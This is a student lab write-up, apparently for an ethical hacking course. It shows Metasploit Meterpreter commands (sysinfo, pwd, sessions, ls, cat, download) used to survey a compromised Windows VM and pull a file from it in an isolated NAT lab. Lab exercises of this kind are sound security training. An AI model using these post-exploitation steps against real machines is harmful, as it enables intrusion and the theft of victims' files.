# Ethical Hacking 3

<h2>Description:</h2>

- Use the Meterpreter session to gather information about the infected machine
  - Learn commands that can be used on Meterpreter to the infected machine: Sysinfo, pwd
  - Learn how to view, download and upload files on the infected machine

<h2>Environment Used</h2>

- Kali Linux and Windows VM : 
  - Network Attached to: NAT Network
  - Name: PublicNAT
  - IP Address = 10.0.9 Network
 
- Tool Used: Metasploit from Kali Linux

<h2>Remote Attack Shell with Meterpreter</h2>

- After the session is running we can type: help in the meterpreter to see the commands we can use on the infected machine

<br />

- To get started by gathering information about the infected machine we can use:
  - > sysinfo
  - This information gives us that the infected machine is:
    - Windows 10 64-bit
    - Build # 22621

<br />

- We can get where the victim downloaded the virus to:
  - > pwd
  - This information gives us the directory of the virus on the infected machine

<br />

- We can check how many machines had been infected by the virus with the session command
  - msf6 exploit(multi/handler) > sessions
  - Have to type in the background command first to go back to the exploit(multi/handler)
  - Can go back to the session with the command:
    - > sessions -i [session Id]

<h2>Viewing, Downloading, and Uploading Files with Meterpreter</h2>

- We can use the list command to see what is in the directory that the virus is downloaded on
  - > ls
  - This lists all the files on the directory that the virus is downloaded on

- We can use the cat command to read the files
  - > cat desktop.ini
  - This gives the configuration information for the Windows VM

- We can even download the files from the infected machine to our hacking device [Kali Linux] by using the download command
  - > download desktop.ini

- We can change the directory for the hacking device on the infected machine by using the cd command
  - > cd ../Documents
  - This changes the directory from Download to Documents

<h2>Conclusion</h2>

- Learned how to look at multiple sessions of the infected machine
  - > msf6 exploit(multi/handler) > sessions
- Learned how to look at the system info of the infected machine
  - > sysinfo
- Learned how to look at the directory of the virus downloaded on the infected machine
  - > pwd
